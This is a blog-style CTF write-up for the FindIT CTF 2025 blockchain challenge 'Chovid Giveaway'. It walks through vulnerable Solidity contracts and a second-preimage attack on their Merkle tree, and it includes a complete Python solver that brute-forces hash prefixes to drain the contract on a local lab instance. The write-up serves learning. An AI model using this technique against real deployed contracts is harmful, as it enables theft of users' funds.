@@ -1,0 +1,684 @@
+---
+title: FindIT CTF 2025 - Chovid Giveaway
+date: 2025/5/19
+bannerImg: /images/posts/findit-ctf-2025-chovid-giveaway/ethereum.jpeg
+description: An upsolve writeup for a blockchain CTF challenge
+tags: [blockchain, solidity]
+---
+
+## Challenge Description
+
+![chovid description](/images/posts/findit-ctf-2025-chovid-giveaway/chovid-description.png)
+
+<details>
+	<summary>hint 1</summary>
+	Just focus on the `redeem` function. Something's wrong with it…
+</details>
+
+<details>
+	<summary>hint 2</summary>
+	The `root` in `Setup` doesn't matter :)
+</details>
+
+<details>
+	<summary>hint 3</summary>
+	When you make 4 giveaways in the same `root`, how many `redeem` you can do? Is it 4 or can be more?
+</details>
+
+<details>
+	<summary>TL;DR</summary>
+	Use second pre-image attack in the vulnerable merkle tree implementations to drain all balances.
+</details>
+
+## Initial Analysis
+
+This challenge presents us with interesting smart contracts. Given Setup.sol and ChovidGiveaway.sol, the goal of this challenge is to drain all balances of the ChovidGiveaway.sol contract.
+
+```solidity filename="Setup.sol" copy {11-12}
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+import "./ChovidGiveaway.sol";
+
+contract Setup {
+    ChovidGiveaway public giveaway;
+    bytes32 public root;
+
+    constructor(bytes32 _root) payable {
+        giveaway = new ChovidGiveaway();
+        giveaway.registerGiveaway{value: 0x40000}(_root);
+    }
+
+    function isSolved() public view returns (bool) {
+        return address(giveaway).balance == 0;
+    }
+}
+```
+
+We can see that it deploys a new `ChovidGiveaway` instance. Then it registers a new giveaway by sending `0x40000` (or 262,144 wei) and a bytes32 root. That root is used in the merkle tree implementation, which is detailed in the giveaway contract.
+
+```solidity filename="ChovidGiveaway.sol" copy
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+contract ChovidGiveaway {
+    error InvalidPasswordLength();
+    error InvalidGiveawayLength();
+    error InvalidGiveawayValue();
+    error AlreadyRedeemed();
+    error InvalidProof();
+    error InvalidValue();
+    error InvalidRoot();
+    error MerkleProofInvalidMultiproof();
+
+    mapping(bytes32 => bool) public redeemedPasswords;
+    mapping(bytes32 => bool) public registeredRoot;
+    address owner;
+
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function registerGiveaway(bytes32 root) public payable onlyOwner {
+        registeredRoot[root] = true;
+    }
+
+    function commutativeKeccak256(
+        bytes32 a,
+        bytes32 b
+    ) internal pure returns (bytes32) {
+        return a < b ? efficientKeccak256(a, b) : efficientKeccak256(b, a);
+    }
+
+    function efficientKeccak256(
+        bytes32 a,
+        bytes32 b
+    ) internal pure returns (bytes32 value) {
+        assembly ("memory-safe") {
+            mstore(0, a)
+            mstore(32, b)
+            value := keccak256(0, 64)
+        }
+    }
+
+    function buildTree(
+        bytes32[] memory _leaves
+    ) internal pure returns (bytes32) {
+        bytes32[] memory leaves = _leaves;
+        if (leaves.length == 0) return bytes32(0);
+        if (leaves.length == 1) return leaves[0];
+
+        uint256 n = leaves.length;
+
+        while (n > 1) {
+            if (n % 2 == 1) revert InvalidGiveawayLength();
+
+            for (uint256 i = 0; i < n / 2; i++) {
+                bytes32 left = leaves[2 * i];
+                bytes32 right = leaves[2 * i + 1];
+                bytes32 parent = commutativeKeccak256(left, right);
+
+                leaves[i] = parent; // Write back to the same array
+            }
+
+            if (n % 2 == 1) {
+                leaves[n / 2] = leaves[n - 1];
+            }
+
+            n = (n + 1) / 2;
+        }
+
+        return leaves[0];
+    }
+
+    function verify(
+        bytes32[] memory proof,
+        bytes32 root,
+        bytes32 leaf
+    ) internal pure returns (bool) {
+        return processProof(proof, leaf) == root;
+    }
+
+    function processProof(
+        bytes32[] memory proof,
+        bytes32 leaf
+    ) internal pure returns (bytes32) {
+        bytes32 computedHash = leaf;
+        for (uint256 i = 0; i < proof.length; i++) {
+            computedHash = commutativeKeccak256(computedHash, proof[i]);
+        }
+        return computedHash;
+    }
+
+    function createGiveaway(
+        bytes[] memory passwords,
+        uint16[] memory amounts
+    ) external payable returns (bytes32 root) {
+        if (passwords.length != amounts.length) revert InvalidGiveawayLength();
+
+        if (passwords.length != 4) revert InvalidGiveawayLength();
+
+        uint256 totalValue;
+        bytes32[] memory leaves = new bytes32[](passwords.length);
+
+        for (uint256 i = 0; i < passwords.length; i++) {
+            if (passwords[i].length > type(uint24).max)
+                revert InvalidPasswordLength();
+
+            uint256 maxPerGiveaway = 0x10000;
+            if (amounts[i] >= maxPerGiveaway) revert InvalidGiveawayValue();
+
+            totalValue += amounts[i];
+
+            bytes memory encoded = abi.encodePacked(
+                uint24(passwords[i].length),
+                passwords[i],
+                amounts[i]
+            );
+            leaves[i] = keccak256(encoded);
+        }
+
+        if (msg.value != totalValue) revert InvalidValue();
+
+        root = buildTree(leaves);
+        registeredRoot[root] = true;
+    }
+
+    function redeem(
+        bytes32[] memory proof,
+        bytes32 root,
+        bytes memory password,
+        uint16 amount
+    ) external {
+        if (!registeredRoot[root]) revert InvalidRoot();
+        if (password.length > type(uint24).max) revert InvalidPasswordLength();
+
+        bytes memory encoded = abi.encodePacked(
+            uint24(password.length),
+            password,
+            amount
+        );
+        bytes32 leaf = keccak256(encoded);
+
+        if (redeemedPasswords[leaf]) revert AlreadyRedeemed();
+
+        if (!verify(proof, root, leaf)) revert InvalidProof();
+
+        redeemedPasswords[leaf] = true;
+
+        uint256 gift = uint256(amount);
+        payable(msg.sender).transfer(gift);
+    }
+}
+```
+
+Basically, the giveaway contract uses a Merkle tree to store the giveaways. By using a Merkle tree, we can store multiple data (in this case giveaways) with just storing its single root. So later on, we can verify whether a giveaway exists or not by only providing some proofs and the data we want to verify. Here's the visual example of a Merkle tree:
+
+![merkle tree explanation](/images/posts/findit-ctf-2025-chovid-giveaway/merkle-tree-explanation.png)
+
+In this example, assume `l1`, `l2`, …, `l8` represent the giveaway data we want to store. According to the contract, each giveaway consists of a password and an amount. Here is the code from the `createGiveaway` function
+
+```solidity copy
+ function createGiveaway(
+    bytes[] memory passwords,
+    uint16[] memory amounts
+) external payable returns (bytes32 root) {
+    if (passwords.length != amounts.length) revert InvalidGiveawayLength();
+
+    if (passwords.length != 4) revert InvalidGiveawayLength();
+
+    uint256 totalValue;
+    bytes32[] memory leaves = new bytes32[](passwords.length);
+
+    for (uint256 i = 0; i < passwords.length; i++) {
+        if (passwords[i].length > type(uint24).max)
+            revert InvalidPasswordLength();
+
+        uint256 maxPerGiveaway = 0x10000; // max 65,536
+        if (amounts[i] >= maxPerGiveaway) revert InvalidGiveawayValue();
+
+        totalValue += amounts[i];
+
+        bytes memory encoded = abi.encodePacked(
+            uint24(passwords[i].length), // 3 bytes
+            passwords[i],
+            amounts[i] // 2 bytes
+        );
+        leaves[i] = keccak256(encoded);
+    }
+
+    if (msg.value != totalValue) revert InvalidValue();
+
+    root = buildTree(leaves);
+    registeredRoot[root] = true;
+}
+```
+
+-   We can store a password with a maximum length of `uint24`, which is 24 bits or 3 bytes, allowing values up to `2 ** 24 - 1 = 16,777,215`.
+-   The password itself is of type `bytes`, which is a dynamically sized byte array.
+-   The maximum amount we can store is `0x10000` or 65,536, which matches the maximum value of a `uint16` (16 bits or 2 bytes), i.e., `2 ** 16 - 1 = 65,535`.
+-   All of these values—password length, password, and amount—will be merged into a single byte array like this:
+    `[password_length (3 bytes)] + [password (n bytes)] + [amount (2 bytes)]`.
+-   These bytes will be hashed using `keccak256`, which always produces a 256-bit (32-byte) hash.
+-   Then, all of these hashes will be combined with their siblings to generate their parent hashes, eventually forming the Merkle root.
+
+So, to redeem all balances, we need to provide the registered root and a valid leaf.
+
+```solidity copy
+function redeem(
+    bytes32[] memory proof,
+    bytes32 root,
+    bytes memory password,
+    uint16 amount
+) external {
+    if (!registeredRoot[root]) revert InvalidRoot();
+    if (password.length > type(uint24).max) revert InvalidPasswordLength();
+
+    bytes memory encoded = abi.encodePacked(
+        uint24(password.length),
+        password,
+        amount
+    );
+    bytes32 leaf = keccak256(encoded);
+
+    if (redeemedPasswords[leaf]) revert AlreadyRedeemed();
+
+    if (!verify(proof, root, leaf)) revert InvalidProof();
+
+    redeemedPasswords[leaf] = true;
+
+    uint256 gift = uint256(amount);
+    payable(msg.sender).transfer(gift);
+}
+```
+
+At first, I thought we needed to find a way to brute-force matching leaves that produce the same root provided by `Setup`. But that approach involves way too many possibilities, especially since the maximum password length is huge. Fortunately, the problem setter provided a hint to help clarify this.
+
+That means the only viable option is to create our own Merkle tree using the `createGiveaway` function. But even then, we’re required to provide an amount. So the question is: how can we possibly drain all the balances if all we can do is add amounts to the contract and redeem exactly what we added?
+
+After hours of searching for solutions (and of course, asking my AI Assistant, which wasn’t very helpful that time), I finally stumbled upon this article about a **Second Preimage Attack on Merkle Trees**:
+
+👉 [Second Preimage Attack in Merkle Trees – RareSkills](https://www.rareskills.io/post/merkle-tree-second-preimage-attack)
+
+Basically, we’re only supposed to be able to redeem individual leaf nodes. But with this attack, we can actually redeem intermediary nodes too. And the crazy part? We can customize those intermediary nodes to drain all the balances!
+
+## Solution
+
+![merkle solution](/images/posts/findit-ctf-2025-chovid-giveaway/merkle-solution.png)
+
+In that example, if we pass `a`, which is not a leaf, the program still treats it as a valid leaf.
+
+`a` itself is created by `hash(left) + hash(right)`. Each of these is 32 bytes in length, so the result is 64 bytes after concatenation.
+
+![password bytes](/images/posts/findit-ctf-2025-chovid-giveaway/password-bytes.png)
+
+So from there, if we construct the hashes like this:
+
+-   `hash(left)` = `00003b...` → the first 3 bytes represent a password length of 59
+-   `hash(right)` = `...ffff` → the last 2 bytes represent the maximum amount of 65,535
+
+Then, `a` will be `00003b...ffff`, with a total size of 64 bytes. This means we can redeem the maximum amount from each intermediary node.
+
+Alright then, let’s just build our trees like this
+
+### Tree 1
+
+![tree 1](/images/posts/findit-ctf-2025-chovid-giveaway/tree-1.png)
+
+### Tree 2 (same)
+
+![tree 2](/images/posts/findit-ctf-2025-chovid-giveaway/tree-2.png)
+
+As you can see, 131070 × 2 = 262140, so we're still leaving 4 wei unclaimed. We need to construct our final tree with a slightly different structure to drain the remaining amount.
+
+### Tree 3
+
+![tree 3](/images/posts/findit-ctf-2025-chovid-giveaway/tree-3.png)
+
+To create those trees, we need to find a “special” password that generates the desired hash. Simply, we can brute-force numbers starting from 0 until we find matching hashes. Then, we register those three special trees and redeem all the leaves. Finally, we perform the second preimage attack by redeeming the intermediary nodes.
+
+## Executing the Solution
+
+First, setup your local instance. You can follow the instructions from here: https://github.com/TCP1P/TCP1P-CTF-Blockchain-Infra
+
+Here's the full solver script written in python
+
+```python filename="solver.py" copy
+from eth_hash.auto import keccak
+import struct
+import multiprocessing as mp
+import time
+from foundpy import *
+
+def number_to_bytes(number):
+    return number.to_bytes((number.bit_length() + 7) // 8 or 1, byteorder='big')
+
+def encode_leaf(password, amount):
+    password_len = len(password)
+    if password_len > 2**24 - 1:
+        raise ValueError("Invalid password length")
+    if amount >= 0x10000:
+        raise ValueError("Invalid giveaway value")
+
+    encoded = struct.pack(">I", password_len)[1:] + password + struct.pack(">H", amount)
+    return keccak(encoded)
+
+def efficient_keccak256(a, b):
+    """Hash two bytes32 values with keccak256"""
+    return keccak(a + b)
+
+def commutative_keccak256(a, b):
+    """Ensure consistent hash regardless of parameter order"""
+    if a < b:
+        return efficient_keccak256(a, b)
+    else:
+        return efficient_keccak256(b, a)
+
+def build_tree(leaves):
+    """Build a Merkle tree from leaf nodes"""
+    if len(leaves) == 0:
+        return bytes(32), []  # Return 0 bytes32 and empty nodes list
+    if len(leaves) == 1:
+        return leaves[0], [leaves]
+
+    n = len(leaves)
+    if n != 4:  # The contract requires exactly 4 leaves
+        raise ValueError("Invalid giveaway length")
+
+    # Copy leaves to avoid modifying the original
+    current_level = leaves.copy()
+    all_levels = [current_level.copy()]  # Store all levels
+
+    while n > 1:
+        if n % 2 != 0:
+            raise ValueError("Invalid giveaway length")
+
+        next_level = []
+        for i in range(0, n, 2):
+            left = current_level[i]
+            right = current_level[i + 1]
+            parent = commutative_keccak256(left, right)
+            next_level.append(parent)
+
+        all_levels.append(next_level.copy())  # Store this level
+        current_level = next_level
+        n = len(next_level)
+
+    return current_level[0], all_levels  # Root and all levels
+
+def short_hash(h, label=None):
+    short = h.hex()[:8] + "..." + h.hex()[-8:]
+    if label:
+        return f"{short} ({label})"
+    return short
+
+def visualize_tree(leaves, all_levels):
+    """Create an ASCII visualization of the Merkle tree"""
+    # Shortened hash representation for readability
+
+    # Root level
+    root = all_levels[-1][0]
+    root_repr = short_hash(root, "Root")
+
+    # Level 1 (2 nodes)
+    level1 = all_levels[-2]
+    level1_repr = [short_hash(node, f"L1-{i}") for i, node in enumerate(level1)]
+
+    # Leaf level (4 nodes)
+    leaf_repr = [short_hash(leaf) for leaf in leaves]
+
+    # Build the tree visualization
+    tree_viz = [
+        f"Tree Visualization:\n",
+        f"                                      {root_repr}                                      ",
+        f"                                         |                                         ",
+        f"                   /----------------------------------------\\                   ",
+        f"                  /                                          \\                  ",
+        f"        {level1_repr[0]}                          {level1_repr[1]}        ",
+        f"                  |                                          |                  ",
+        f"         /----------------\\                        /----------------\\         ",
+        f"        /                  \\                      /                  \\        ",
+        f"{leaf_repr[0]}  {leaf_repr[1]}  {leaf_repr[2]}  {leaf_repr[3]}"
+    ]
+
+    return "\n".join(tree_viz)
+
+def print_tree_details(leaves, all_levels):
+    print('\nAll Levels:')
+    print([[m.hex() for m in n] for n in all_levels])
+
+    print("\nLeaf Nodes:")
+    for i, leaf in enumerate(leaves):
+        print(f"Leaf {i}: {leaf.hex()}")
+
+    print("\nIntermediate Nodes:")
+    for level_idx, level in enumerate(all_levels[1:], 1):  # Skip leaf level
+        print(f"Level {level_idx}:")
+        for node_idx, node in enumerate(level):
+            print(f"  Node {node_idx}: {node.hex()}")
+
+    print('\n' + visualize_tree(leaves, all_levels))
+
+def decode_creds(left: bytes, right: bytes):
+    parent = left + right # 32 + 32 = 64 bytes
+    passwd = parent[3:62]
+    amount = parent[62:]
+    return passwd, amount
+
+def check_range(start, end, amount, target_prefix, check_at, find_matches, return_dict):
+    local_matches = []
+    for number in range(start, end):
+        number_bytes = number_to_bytes(number)
+        result = encode_leaf(number_bytes, amount).hex()
+
+        check_at_func = result.startswith if check_at == 'start' else result.endswith
+
+        if check_at_func(target_prefix):
+            print(f'FOUND: {number}, hash: {result}')
+            local_matches.append(number)
+
+            # Exit early if we found enough matches
+            if len(local_matches) >= find_matches:
+                break
+
+    return_dict[start] = local_matches
+
+def start_bruteforce(target_prefix: str, check_at: str, find_matches: int,amount=0, num_cores=mp.cpu_count()):
+    # Set multiprocessing start method to 'fork' if available (faster on macOS)
+    if hasattr(mp, 'set_start_method'):
+        try:
+            mp.set_start_method('fork')
+        except RuntimeError:
+            # Method already set
+            pass
+
+    print(f"Using {num_cores} CPU cores")
+
+    # Larger chunk size for better efficiency
+    chunk_size = 500000
+
+    start_time = time.time()
+    matched_numbers = []
+
+    # Use Manager to share results between processes
+    with mp.Manager() as manager:
+        return_dict = manager.dict()
+
+        batch_start = 0
+        chunks_per_batch = num_cores
+
+        while True:
+            if len(matched_numbers) >= find_matches:
+                break
+
+            active_processes = []
+
+            # Start num_cores processes with distributed ranges
+            for i in range(chunks_per_batch):
+                start = batch_start + (i * chunk_size)
+                end = start + chunk_size
+
+                p = mp.Process(target=check_range, args=(start, end, amount, target_prefix, check_at, find_matches, return_dict))
+                active_processes.append(p)
+                p.start()
+
+            # Wait for current batch to complete
+            for p in active_processes:
+                p.join()
+
+            # Check if we have enough matches
+            all_matches = []
+            for matches in return_dict.values():
+                all_matches.extend(matches)
+
+            matched_numbers = all_matches
+
+            # Show progress
+            print(f"Progress: Checked up to {batch_start + (chunks_per_batch * chunk_size)}, found {len(matched_numbers)} matches so far")
+
+            if len(matched_numbers) >= find_matches:
+                matched_numbers = matched_numbers[:find_matches]
+                break
+
+            # Move to next batch
+            batch_start += chunks_per_batch * chunk_size
+
+    end_time = time.time()
+
+    print("\nMatched numbers:")
+    for number in matched_numbers:
+        print(f"  {number} -> {encode_leaf(number_to_bytes(number), amount).hex()}")
+
+    print(f"\nFound {len(matched_numbers)} matches in {end_time - start_time:.2f} seconds")
+
+    return matched_numbers
+
+def main():
+    print('finding 5 start numbers to produce 00003b...')
+    matched_start_numbers = start_bruteforce(
+        target_prefix='00003b', # 59
+        check_at='start',
+        find_matches=5
+    )
+    matched_start_numbers.append(8123) # doesn't matter
+
+    print('finding 4 end numbers to produce ...ffff')
+    matched_end_numbers = start_bruteforce(
+        target_prefix='ffff', # 65535
+        check_at='end',
+        find_matches=4
+    )
+    print('finding 1 end numbers to produce ...0004')
+    matched_end_numbers.extend(start_bruteforce(
+        target_prefix='0004', # 4
+        check_at='end',
+        find_matches=1
+    ))
+    matched_end_numbers.append(1231) # doesn't matter
+
+    # setup contract
+    config.setup(
+        rpc_url='http://localhost:48334/d89f0c5f-fad6-4b0f-b441-9919c8e68b85',
+        privkey='7fcb3a5a5588b9814efbae7823e0c1a19207147717558388bee623fd9dd79f7f'
+    )
+
+    setup_addr = '0x540a96823799f227EB343Da66B45C02a7871c169'
+    setup_contract = Contract(setup_addr, 'Setup.sol')
+    giveaway_addr = setup_contract.call('giveaway()')
+    giveaway_contract = Contract(giveaway_addr, 'ChovidGiveaway.sol')
+
+    # create 3 trees
+    # each tree has 2 intermediary nodes
+    # each intermediary nodes can has amount up to 0xffff (65535)
+    # but in the last 2 intermediary nodes, we just need 4 remaining weis
+    # because of 65535 * 4 = 262140 + 4 (remaining) = 262144 (0x40000)
+    for i in range(3):
+        passwords = [
+            number_to_bytes(matched_start_numbers[i * 2]),
+            number_to_bytes(matched_end_numbers[i * 2]),
+            number_to_bytes(matched_start_numbers[i * 2 + 1]),
+            number_to_bytes(matched_end_numbers[i * 2 + 1]),
+        ]
+
+        leaves = [encode_leaf(passwd, 0) for passwd in passwords]
+
+        # create the tree
+        root, all_levels = build_tree(leaves)
+        print_tree_details(leaves, all_levels)
+
+        print('creating giveaway')
+        print(giveaway_contract.send(
+            'createGiveaway(bytes[],uint16[])',
+            passwords,
+            [0, 0, 0, 0],
+            value=0
+        ).hex())
+
+        # redeem all leaves
+        for i, passwd in enumerate(passwords):
+            print(giveaway_contract.send(
+                'redeem(bytes32[],bytes32,bytes,uint16)',
+                [
+                    all_levels[0][i + 1 if i % 2 == 0 else i - 1],
+                    all_levels[1][1 if i < 2 else 0]
+                ],
+                root,
+                passwd,
+                0
+            ).hex())
+
+        # redeem intermediary leaves
+        for i in range(2):
+            giveaway_balance = giveaway_contract.get_balance()
+            print(f'giveaway balance: {giveaway_balance} wei')
+            if giveaway_balance <= 0:
+                break
+
+            left = all_levels[0][i * 2]
+            right = all_levels[0][i * 2 + 1]
+            passwd, amount = decode_creds(left, right)
+
+            print(giveaway_contract.send(
+                'redeem(bytes32[],bytes32,bytes,uint16)',
+                [
+                    all_levels[1][int(not i)]
+                ],
+                root,
+                passwd,
+                int.from_bytes(amount, 'big')
+            ).hex())
+
+    print('isSolved:')
+    print(setup_contract.call('isSolved()'))
+
+if __name__ == "__main__":
+    main()
+```
+
+Here's the output
+
+1. Finding 5 start numbers to produce 00003b…
+   ![output 1](/images/posts/findit-ctf-2025-chovid-giveaway/output-1.png)
+
+2. Finding 4 end numbers to produce ...ffff
+   ![output 2](/images/posts/findit-ctf-2025-chovid-giveaway/output-2.png)
+
+3. Finding 1 end numbers to produce ...0004
+   ![output 3](/images/posts/findit-ctf-2025-chovid-giveaway/output-3.png)
+
+4. Register and redeem the first tree
+   ![output 4](/images/posts/findit-ctf-2025-chovid-giveaway/output-4.png)
+
+5. Register and redeem the second tree
+   ![output 5](/images/posts/findit-ctf-2025-chovid-giveaway/output-5.png)
+
+6. Register and redeem the third tree
+   ![output 6](/images/posts/findit-ctf-2025-chovid-giveaway/output-6.png)
+
+7. Flag
+   ![flag](/images/posts/findit-ctf-2025-chovid-giveaway/flag.png)
